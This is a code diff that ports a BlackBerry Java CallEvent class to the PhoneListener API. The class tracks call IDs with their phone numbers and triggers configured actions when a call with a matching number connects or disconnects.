@@ -9,7 +9,11 @@
 package blackberry.event;
 
 import java.io.EOFException;
+import java.util.Hashtable;
 
+import net.rim.blackberry.api.phone.Phone;
+import net.rim.blackberry.api.phone.PhoneCall;
+import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
 import blackberry.debug.Debug;
@@ -21,7 +25,7 @@ import blackberry.utils.WChar;
 /**
  * The Class CallEvent.
  */
-public final class CallEvent extends Event implements PhoneCallObserver {
+public final class CallEvent extends Event implements PhoneListener {
     //#ifdef DEBUG
     private static Debug debug = new Debug("CallEvent", DebugLevel.VERBOSE);
     //#endif
@@ -44,11 +48,11 @@ public final class CallEvent extends Event implements PhoneCallObserver {
     }
 
     protected void actualStart() {
-        AppListener.getInstance().addPhoneCallObserver(this);
+        Phone.addPhoneListener(this);
     }
 
     protected void actualStop() {
-        AppListener.getInstance().removePhoneCallObserver(this);
+        Phone.removePhoneListener(this);
     }
 
     /*
@@ -85,31 +89,135 @@ public final class CallEvent extends Event implements PhoneCallObserver {
         return true;
     }
 
-    public void onCallAnswered(int callId, String phoneNumber) {
-        // TODO Auto-generated method stub
+    Hashtable callingHistory = new Hashtable();
 
-    }
-
-    public void onCallConnected(int callId, String phoneNumber) {
-        if (number.length() == 0 || phoneNumber.endsWith(number)) {
-            trigger(actionOnEnter);
-        }
-    }
+    
 
     public void onCallDisconnected(int callId, String phoneNumber) {
+       
+    }
+
+    public void callAdded(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callAnswered(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callConferenceCallEstablished(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callConnected(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
+        final boolean outgoing = phoneCall.isOutgoing();
+
+        synchronized (callingHistory) {
+            callingHistory.put(new Integer(callId), phoneNumber);
+        }
+        
+        if (number.length() == 0 || phoneNumber.endsWith(number)) {
+            trigger(actionOnEnter);
+        } 
+    }
+
+    public void callDirectConnectConnected(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callDirectConnectDisconnected(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callDisconnected(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        String phoneNumber = null;
+
+        if (phoneCall != null) {
+
+            phoneNumber = phoneCall.getDisplayPhoneNumber();
+            //outgoing = phoneCall.isOutgoing();
+
+        } else {
+
+            synchronized (callingHistory) {
+                if (callingHistory.containsKey(new Integer(callId))) {
+                    phoneNumber = (String) callingHistory.get(new Integer(
+                            callId));
+                    callingHistory.remove(new Integer(callId));
+                }
+            }
+
+            //#ifdef DEBUG
+            debug.trace("callDisconnected phoneNumber: " + phoneNumber);
+            //#endif
+        }
+
         if (number.length() == 0 || phoneNumber.endsWith(number)) {
             trigger(actionOnExit);
         }
     }
 
-    public void onCallIncoming(int callId, String phoneNumber) {
+    public void callEndedByUser(int callId) {
         // TODO Auto-generated method stub
-
+        
     }
 
-    public void onCallInitiated(int callId, String phoneNumber) {
+    public void callFailed(int callId, int reason) {
         // TODO Auto-generated method stub
+        
+    }
 
+    public void callHeld(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callIncoming(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
+        final boolean outgoing = phoneCall.isOutgoing();
+
+        synchronized (callingHistory) {
+            callingHistory.put(new Integer(callId), phoneNumber);
+        }
+    }
+
+    public void callInitiated(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
+        final boolean outgoing = phoneCall.isOutgoing();
+
+        synchronized (callingHistory) {
+            callingHistory.put(new Integer(callId), phoneNumber);
+        }
+    }
+
+    public void callRemoved(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callResumed(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callWaiting(int callid) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void conferenceCallDisconnected(int callId) {
+        // TODO Auto-generated method stub
+        
     }
 
 }
